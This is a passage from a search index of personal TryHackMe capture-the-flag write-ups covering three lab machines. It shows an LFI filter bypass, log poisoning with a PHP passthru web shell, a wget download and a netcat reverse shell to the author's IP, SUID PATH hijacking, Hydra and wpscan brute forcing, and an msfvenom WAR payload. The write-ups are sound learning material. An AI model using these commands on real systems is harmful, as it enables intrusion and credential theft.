{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to my CTF Writeups","text":"<p>This page contains my writeups for various TryHackMe CTFs, organized by difficulty levels.  Click on the links below to navigate to each section:</p> <ul> <li>Easy CTFs</li> <li>Medium CTFs</li> <li>Hard CTFs</li> <li>Insane CTFs</li> </ul> <p><p>Note: certain sections are currently under development and may not yet be fully functional. It is normal to receive 404 errors as I work to  and update the site.</p> <p>"},{"location":"#find-me-here","title":"Find me here","text":"<p>"},{"location":"easy/ARcHanG3l/","title":"ARcHanG3l","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> <p>Path to accomplish the CTF:</p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul>"},{"location":"easy/ARcHanG3l/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code>  # Nmap 7.93 scan initiated Mon Feb 20 01:06:35 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.45.108\nNmap scan report for 10.10.45.108\n  Host is up (0.15s latency).\n  Not shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)\n|   256 637327c76104256a08707a36b2f2840d (ECDSA)\n|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Wavefire\n  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/20%OT=22%CT=1%CU=35053%PV=Y%DS=5%DC=I%G=Y%TM=63F30E0\n  OS:7%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS\n  OS:=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4\n  OS:B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Mon Feb 20 01:07:03 2023 -- 1 IP address (1 host up) scanned in 27.88 seconds\n</code></pre></li> </ul>"},{"location":"easy/ARcHanG3l/#enumeration","title":"Enumeration","text":"<p>As a part of Enumeration, I began by scanning the website on port 80 and stumbled upon a <code>wavefire</code> template. But thankfully, this led me to the domain name \"mafialive.thm\", which I added to my <code>/etc/hosts</code> file and accessed via the domain name.</p> <pre><code>127.0.0.1 localhost\n127.0.1.1 kali\n10.10.180.241 team.thm\n10.10.180.241 dev.team.thm\n10.10.45.108 mafialive.thm\n</code></pre> <p></p> <p>Upon accessing the page, I discovered <code>flag-1</code></p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul> <p>But there was nothing noteworthy beyond that. As a result, I executed the <code>dirsearch</code> script to locate hidden directories and files. Here, I discovered /test.php and accessed it.</p> <p><pre><code>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927\n\nOutput File: /home/kali/.dirsearch/reports/mafialive.thm/_23-02-21_09-38-53.txt\n\nError Log: /home/kali/.dirsearch/logs/errors-23-02-21_09-38-53.log\n\nTarget: http://mafialive.thm/\n\n[09:38:54] Starting: [09:38:59] 403 -  278B  - /.ht_wsr.txt                                     [09:38:59] 403 -  278B  - /.htaccess.bak1\n[09:38:59] 403 -  278B  - /.htaccess.sample\n[09:38:59] 403 -  278B  - /.htaccess.orig\n[09:38:59] 403 -  278B  - /.htaccess.save\n[09:38:59] 403 -  278B  - /.htaccess_sc\n[09:38:59] 403 -  278B  - /.htaccess_extra\n[09:38:59] 403 -  278B  - /.htaccess_orig\n[09:38:59] 403 -  278B  - /.htaccessBAK\n[09:38:59] 403 -  278B  - /.htaccessOLD\n[09:38:59] 403 -  278B  - /.htaccessOLD2\n[09:38:59] 403 -  278B  - /.htm                                            [09:38:59] 403 -  278B  - /.html\n[09:38:59] 403 -  278B  - /.htpasswd_test\n[09:38:59] 403 -  278B  - /.htpasswds\n[09:38:59] 403 -  278B  - /.httr-oauth\n[09:39:01] 403 -  278B  - /.php                                            [09:39:34] 200 -   59B  - /index.html                                       [09:39:46] 200 -   34B  - /robots.txt                                       [09:39:47] 403 -  278B  - /server-status/                                   [09:39:47] 403 -  278B  - /server-status                                    [09:39:51] 200 -  286B  - /test.php                                         \nTask Completed\n</code></pre> This was quite interesting, because there was a button and when i clicked, it gave me a opportunity to explore on LFI (Local file Inclusion vulnerabilities)</p> <p></p> <p>In attempting to access \"<code>/etc/passwd</code>\" via the URL http://mafialive.thm/test.php?view=/etc/passwd, I encountered some restrictions. To determine the parameters of access permissions, including those that were denied, I proceeded to review the source code.</p> <p>I found this on web to encode the content as base64 and decode it back as php. </p> <p>LFI-PHP Base64 Encode/Decode</p> <p><p>php://filter/convert.base64-encode/resource=file:///etc/passwd</p></p> <p>I proceeded to execute the following command: </p> <pre><code>http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=file:///var/www/html/development_testing/test.php \n</code></pre> <p></p> <p>Upon decoding the result, I was able to successfully access the <code>test.php</code> file, and the source code appeared as follows. It seems that the flag-2 was hidden in the source code of the test.php file I accessed.</p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul> <pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n    &lt;title&gt;INCLUDE&lt;/title&gt;\n    &lt;h1&gt;Test Page. Not to be Deployed&lt;/h1&gt;\n\n    &lt;/button&gt;&lt;/a&gt; &lt;a href=\"/test.php?view=/var/www/html/development_testing/mrrobot.php\"&gt;&lt;button id=\"secret\"&gt;Here is a button&lt;/button&gt;&lt;/a&gt;&lt;br&gt;\n        &lt;?php\n\n        //FLAG: thm{explo1t1ng_lf1}\n            function containsStr($str, $substr) {\n                return strpos($str, $substr) !== false;\n            }\n        if(isset($_GET[\"view\"])){\n        if(!containsStr($_GET['view'], '../..') &amp;&amp; containsStr($_GET['view'], '/var/www/html/development_testing')) {\n                include $_GET['view'];\n            }else{\n\n        echo 'Sorry, Thats not allowed';\n            }\n    }\n        ?&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n</code></pre> <p>The restrictions placed on the \"view\" parameter are evident; specifically, the string var/www/html/development_testing was allowed, while any occurrence of ../.. was not permitted. Through reverse engineering, I found a way to bypass these limitations, resulting in the following modified command.</p> <pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd\n</code></pre> <p>That was working, and It gave me the results.</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:109::/run/uuidd:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\narchangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash\n</code></pre>"},{"location":"easy/ARcHanG3l/#initial-access","title":"Initial Access","text":"<p>I saw an opportunity to explore further and decided to try a different file. In the context of Local File Inclusion (LFI), the remote files cannot be accessed, but it is possible to modify the contents of local files. This provided an opening to execute a straightforward PHP script on log files.</p> <pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log\n</code></pre> <p>The server is configured to use Apache, which usually stores its log files in the directory <code>/var/log/apache2/access.log.</code> By utilizing the PHP command: </p> <p>PHP Command Execution</p> <p><p>&lt;? passthru($_GET[cmd]) ?&gt;</p></p> <p>we could pass commands as an argument through <code>cmd</code> and successfully execute them.</p> <p></p> <p>I though of a plan to download a reverse shell onto the server by utilizing the \"cmd\" argument. The command was structured as follows: </p> <pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&amp;cmd=wget%20%20http://10.17.3.217:8000/shell.php\n</code></pre> <p>Note</p> <p>I had a local Python HTTP server beforehand.</p> <p></p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul> <p>Subsequently, I accessed </p> <p><pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/shell.php\n</code></pre> which enabled me to gain initial access. Using this access, I successfully located the flag-3 at \"/home/archangel/user.txt\"</p> <p></p>"},{"location":"easy/ARcHanG3l/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"easy/ARcHanG3l/#gaining-user-access-horizontal","title":"Gaining User access (Horizontal)","text":"<p>Afterwards, I was able to escalate my privileges horizontally for the user <code>archangel</code>. By running the <code>linpeas.sh</code> script, I discovered that there was a cron job running with the following configuration:</p> <pre><code>*/1 * * * * archangel /opt/helloworld.sh\n</code></pre> <p>This presented an opportunity to execute a reverse shell. To do so, I modified the code within the <code>helloworld.sh</code> file to include the following command:</p> <p>Reverse Shell Command</p> <p>echo \"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.17.3.217 5433\" &gt; /opt/helloworld.sh</p> <p>As a result of this change, I was able to successfully execute a reverse shell and obtain the flag-4 located at  ~/secret/user2.txt</p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul>"},{"location":"easy/ARcHanG3l/#gaining-root-access-vertical","title":"Gaining Root access (Vertical)","text":"<p>Upon gaining access to the <code>archangel</code> account, I was keen to identify any binaries with SUID permissions since I lacked passwords for any of the users. Consequently, I ran the following command:</p> <pre><code>find / -type f -perm -04000 -ls 2&gt;/dev/null\n\n392217     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp\n396413     76 -rwsr-xr-x   1 root     root        75824 Mar 23  2019 /usr/bin/gpasswd\n393011     76 -rwsr-xr-x   1 root     root        76496 Mar 23  2019 /usr/bin/chfn\n395021     44 -rwsr-xr-x   1 root     root        44528 Mar 23  2019 /usr/bin/chsh\n396417     60 -rwsr-xr-x   1 root     root        59640 Mar 23  2019 /usr/bin/passwd\n406571     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils\n396823    148 -rwsr-xr-x   1 root     root       149080 Sep 23  2020 /usr/bin/sudo\n392437     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n524345    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign\n396700     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device\n652899     28 -rwsr-xr-x   1 root     root          26696 Sep 17  2020 /bin/umount\n652831     44 -rwsr-xr-x   1 root     root          44664 Mar 23  2019 /bin/su\n652862     44 -rwsr-xr-x   1 root     root          43088 Sep 17  2020 /bin/mount\n660690     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount\n652934     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping\n1053235     20 -rwsr-xr-x   1 root     root          16904 Nov 18  2020 /home/archangel/secret/\n</code></pre> <p>During the search, I noticed that the <code>/home/archangel/secret/</code> directory appeared suspicious. Further investigation revealed the presence of an <code>ELF binary</code> with the SUID bit set. I used the <code>strings</code> command to examine its content, which indicated that the binary was copying files using the following command:</p> <pre><code>cp /home/user/archangel/myfiles/* /opt/backupfiles\n</code></pre> <p>However, since the path did not exist, it was unlikely that the program would run successfully. To exploit this vulnerability, I created a <code>cp</code> binary file in the<code>/tmp</code> directory and added the path to it as follows:</p> <pre><code>export PATH=\"/tmp:$PATH\"\n</code></pre> <p>With this modification, I was able to execute the \"cp\" command with the SUID permissions and obtain a root shell.</p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul> <p>Success</p> <p>and from there, I had peace upon me! </p>"},{"location":"easy/ToolsRUs/","title":"ToolsRUs","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> <p>In this section, I will discuss about gaining access to a system by exploiting vulnerabilities in various services. The services include Apache Tomcat, Apache Coyote JSP Engine, Apache Jserv, and an HTTP server on port 80.</p>"},{"location":"easy/ToolsRUs/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code>  # Nmap 7.93 scan initiated Wed Feb 22 10:11:28 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.4.144\nNmap scan report for 10.10.4.144\n  Host is up (0.15s latency).\n  Not shown: 996 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n  22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 460e76fbb6a2f7f78536656f8809f7e8 (RSA)\n|   256 a1bc5d3478f4e8d4091805ef9d9072c5 (ECDSA)\n|_  256 0757145539dfc56296f9fc4883cf127e (ED25519)\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n  1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n  |_http-favicon: Apache Tomcat\n  |_http-title: Apache Tomcat/7.0.88\n  |_http-server-header: Apache-Coyote/1.1\n  8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\n|_ajp-methods: Failed to get a valid response for the OPTION request\n  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/22%OT=22%CT=1%CU=33697%PV=Y%DS=5%DC=I%G=Y%TM=63F630B\n  OS:F%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS\n  OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68\nOS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Wed Feb 22 10:11:59 2023 -- 1 IP address (1 host up) scanned in 30.78 seconds\n</code></pre></li> </ul>"},{"location":"easy/ToolsRUs/#enumerating-apache-coyote-jsp-engine","title":"Enumerating Apache Coyote JSP Engine","text":"<p>At first, my plan was to exploit the Apache JSP Engine by uploading a malicious WAR file to obtain a shell. Since I was familiar with this method, I felt confident. However, I was unable to pass the authorization process.</p> <p>In my attempts to gain access to the Tomcat Manager, I initially turned to a Python script to brute force default logins for Apache Tomcat. Unfortunately, this approach also failed. </p>"},{"location":"easy/ToolsRUs/#enumerating-the-http-server","title":"Enumerating the HTTP Server","text":"<p>I then shifted my focus to the HTTP server running on port 80, where I discovered a simple page that hinted at the development of the site. </p> <p></p> <p>Utilizing a dirsearch Python script, I was able to locate potentially hidden pages and directories that could provide further clues and entry points.</p> <pre><code>    Target: http://10.10.4.144/\n\n    [10:13:58] Starting: [10:14:03] 403 -  297B  - /.ht_wsr.txt                                     [10:14:03] 403 -  300B  - /.htaccess.bak1\n    [10:14:03] 403 -  302B  - /.htaccess.sample\n    [10:14:03] 403 -  300B  - /.htaccess.orig\n    [10:14:03] 403 -  300B  - /.htaccess.save\n    [10:14:03] 403 -  301B  - /.htaccess_extra\n    [10:14:03] 403 -  300B  - /.htaccess_orig\n    [10:14:03] 403 -  298B  - /.htaccess_sc\n    [10:14:03] 403 -  298B  - /.htaccessBAK\n    [10:14:03] 403 -  298B  - /.htaccessOLD\n    [10:14:03] 403 -  290B  - /.htm\n    [10:14:03] 403 -  299B  - /.htaccessOLD2                                   [10:14:03] 403 -  291B  - /.html\n    [10:14:03] 403 -  300B  - /.htpasswd_test\n    [10:14:03] 403 -  296B  - /.htpasswds\n    [10:14:03] 403 -  297B  - /.httr-oauth\n    [10:14:36] 200 -  168B  - /index.html                                       [10:14:47] 401 -  458B  - /protected/data/                                  [10:14:47] 401 -  458B  - /protected/runtime/\n    [10:14:47] 301 -  298B -  /guidelines\n    [10:14:49] 403 -  299B  - /server-status                                    [10:14:49] 403 -  300B  - /server-status/\n</code></pre>"},{"location":"easy/ToolsRUs/#exploiting-guidelines-page","title":"Exploiting '/guidelines' page","text":"<p>After running the dirsearch script, I was able to identify two promising directories that could lead to further leads, namely <code>protected</code> and <code>guidelines</code>. The former sounded highly secured, but to my surprise, it was not. While I was filling out the question, I decided to check out the <code>/guidelines</code> page, and found a username called <code>bob</code>.</p> <p></p> <p>Leveraging this discovery, I was able to brute force Bob's password using Hydra, which gave me access to the <code>protected</code> directory. It was a simple HTTP Basic Authorization Request which can be brute forced with the following command:</p> <p>Hydra Command</p> <p><p>hydra $IP -l bob -P ~/rockyou.txt http-get /protected -V</p></p> <p></p> <p>I successfully obtained Bob's login credentials, and used them to access the page that I had discovered earlier.</p>"},{"location":"easy/ToolsRUs/#exploiting-apache-tomcat-with-harvested-credentials","title":"Exploiting Apache Tomcat with Harvested Credentials","text":"<p>When I logged in, I discovered that the Authorization mechanism used for the Tomcat Service and the <code>/protected</code> directory were the same. </p> <p></p> <p>This allowed me to reuse the credentials that I had previously harvested. With access granted, I uploaded a Java WAR file to the manager and made a reverse shell from it.</p> <p>Msfvenom Payload</p> <p>msfvenom -p java/shell_reverse_tcp lhost=10.17.3.217 lport=5432 -f war -o shell.war</p> <p></p> <p>Also, I made a listener, before I accessed http://10.10.4.144:1234/shell/ giving me the shell.</p>"},{"location":"easy/ToolsRUs/#gaining-root-access","title":"Gaining Root access","text":"<p>Surprisingly, I was granted <code>root</code> access, rather than the expected <code>www-data</code> shell. Easy-Peasy</p> <pre><code>root@ip-10-10-4-144:/# cat root/*\ncat root/*\nff1fc4a81affcc7688cf89ae7dc6e0e1\ncat: root/snap: Is a directory\n</code></pre> <p>Peace-out!</p>"},{"location":"easy/colddbox/","title":"ColddBox Easy","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> <p>In this CTF, I was able to successfully exploit a WordPress server using a combination of tools and techniques. In this blog post, I will share my experience and provide insights on how I was able to get the initial foothold, escalate my privileges, and finally became root.</p>"},{"location":"easy/colddbox/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code># Nmap 7.93 scan initiated Mon Feb 20 13:34:05 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.237.179\nNmap scan report for 10.10.237.179\n  Host is up (0.15s latency).\n  Not shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: WordPress 4.1.31\n  |_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: ColddBox | One more machine\n  4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 4ebf98c09bc536808c96e8969565973b (RSA)\n|   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)\n|_  256 f2fc6c750820b1b2512d94d694d7514f (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/20%OT=80%CT=1%CU=42564%PV=Y%DS=5%DC=I%G=Y%TM=63F36FE\n  OS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS\n  OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68\nOS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Mon Feb 20 08:04:40 2023 -- 1 IP address (1 host up) scanned in -19765.28 seconds\n</code></pre></li> </ul>"},{"location":"easy/colddbox/#enumeration","title":"Enumeration","text":"<p>The first step in this process was to enumerate the webserver (WordPress) with its vulnerable plugins, themes, and users using wpscan. </p> <p>User Enumeration</p> <p><p><code>wpscan --url http://$IP -e  u</code></p></p> <p>After running this command, it returned c0ldd, philip, and hugo as usernames.</p> <pre><code>[+] URL: http://10.10.237.179/ [10.10.237.179]\n[+] Started: Mon Feb 20 13:13:31 2023\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n| Found By: Headers (Passive Detection)\n| Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.237.179/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n| Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.237.179/readme.html\n | Found By: Direct Access (Aggressive Detection)\n| Confidence: 100%\n\n[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n|  - http://10.10.237.179/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;\n |  - http://10.10.237.179/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.1.31&lt;/generator&gt;\n\n[+] WordPress theme in use: twentyfifteen\n | Location: http://10.10.237.179/wp-content/themes/twentyfifteen/\n | Last Updated: 2022-11-02T00:00:00.000Z\n | Readme: http://10.10.237.179/wp-content/themes/twentyfifteen/readme.txt\n | [!] The version is out of date, the latest version is 3.3\n | Style URL: http://10.10.237.179/wp-content/themes/twentyfifteen/style.css?ver=4.1.31\n | Style Name: Twenty Fifteen\n | Style URI: https://wordpress.org/themes/twentyfifteen\n | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen simple, st...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\nBrute Forcing Author IDs - Time: 00:00:01 &lt;========================================&gt; (10 / 10) 100.00% Time: 00:00:01\n\n[i] User(s) Identified:\n\n[+] the cold in person\n | Found By: Rss Generator (Passive Detection)\n\n[+] hugo\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] c0ldd\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] philip\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n| Confirmed By: Login Error Messages (Aggressive Detection)\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n</code></pre> <p>I decided to brute force the usernames and passwords using wpscan's built-in feature.</p> <p>Brute Force</p> <p><p><code>wpscan --url $IP -U 'c0ldd,hugo,philip' -P /usr/share/seclists/Passwords/probable-v2-top12000.txt</code></p></p> <pre><code>[+] Enumerating Config Backups (via Passive and Aggressive Methods)\nChecking Config Backups - Time: 00:00:04 &lt;=======================================&gt; (137 / 137) 100.00% Time: 00:00:04\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Wp Login against 3 user/s\n[SUCCESS] - c0ldd / 9876543210                                                                                        ^Cying philip / beanie Time: 00:09:52 &lt;========                                 &gt; (8839 / 40665) 21.73%  ETA: 00:35:35\n[!] Valid Combinations Found:\n | Username: c0ldd, Password: 9876543210\n[!] No WPScan API Token given, as a result vulnerability data has not been output.(8844 / 40665) 21.74%  ETA: 00:35:34\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Mon Feb 20 13:32:05 2023\n[+] Requests Done: 8984\n[+] Cached Requests: 38\n[+] Data Sent: 